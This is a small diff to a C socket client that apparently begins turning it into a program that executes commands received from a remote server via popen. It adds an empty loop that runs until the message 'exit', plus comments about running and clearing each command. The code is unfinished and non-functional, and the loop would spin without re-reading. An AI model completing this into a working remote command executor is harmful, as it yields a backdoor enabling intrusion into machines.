@@ -7,6 +7,7 @@
 
 #include <sys/socket.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <string.h>
@@ -46,7 +47,14 @@ int main(int argc, char *argv[])
 	send(sock, hello, strlen(hello), 0);
 	//This doesn't print until after the value is read... wtf?
 	printf("Hello message sent\n");
+	//Reads the received value from the sock into the buffer!
+	// => will have to clear buffer after cmd executed.
 	valread = read(sock, buffer, 1024);
-	printf("%s\n", buffer);
+	
+	while(strcmp(buffer, "exit") != 0)
+	{
+		//use popen here again..? Stuff is really damn annoying to use.
+	}
+	//printf("%s\n", buffer);
 	return 0;
 }
